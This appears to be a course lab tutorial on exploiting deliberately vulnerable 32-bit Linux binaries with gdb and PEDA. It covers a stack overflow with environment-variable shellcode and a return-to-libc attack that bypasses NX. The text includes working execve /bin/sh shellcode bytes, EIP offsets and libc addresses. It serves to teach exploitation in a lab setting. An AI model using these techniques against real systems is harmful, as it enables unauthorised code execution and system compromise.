1. Let's switch to another tool to build exploits first. 
PEDA. https://github.com/longld/peda

It is already installed on the lab 32bit machines, just run gdb.
Regular gdb commands and new peda functions are available.

We first compile the executable without nx. 

```
make classic
```

Let's exploit it with peda quickly.

- generate a fuzzing patter with python, 'A'*400 in in.txt
and gdb classic
then r < in.txt
It will crash.

- Repeat with pattern:
pattern_create 400 in.txt

- Locate the place:
pattern_offset (eip value)

- Save shell code on the stack through an env var:

Setting environment variable.
```
export PWN=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
```

Shellcode generated in peda with:
shellcode generate linux exec


- Learn where it will be:
```
./getenvaddr PWN ./classic
PWN will be at 0xbffffea8
```

And exploit. See payloadgen.py, make payload then:

(cat in.txt; cat) | ./classic


2. Time to switch on NX and retry.


First stop the library randomization.

```
ulimit -s unlimited
```

Next, debugging comes in play. Finding EIP offset:

```
gdb nx
pattern_create 400 patt.txt
r < patt.txt 
EIP: 0x4c414136
gdb-peda$ pattern_offset  0x4c414136
1279344950 found at offset: 96 - EIP
```

Now let's find a ret in libc:

```
gdb-peda$ ropgadget 
ret = 0x80482f2  - this goes into EIP
\xf2\x82\x04\x08
```

In ESP register: 
gdb-peda$ pattern_offset AAhAA7AAMA
AAhAA7AAMA found at offset: 100  - Here goes the pointer to system and then a pointer to bin sh

So we can just continue overwrite it.


Finding system function:

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x40085020 <__libc_system>
\x20\x50\x08\x40
```

Finding an argument for it:

```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
  nx : 0x80485ab ("/bin/sh")
  nx : 0x80495ab ("/bin/sh")
libc : 0x401a960f ("/bin/sh")
e.g. the last one \x0f\x96\x1a\x40
```

Now an exploit buffer can be built like this:

see nxgen.py.

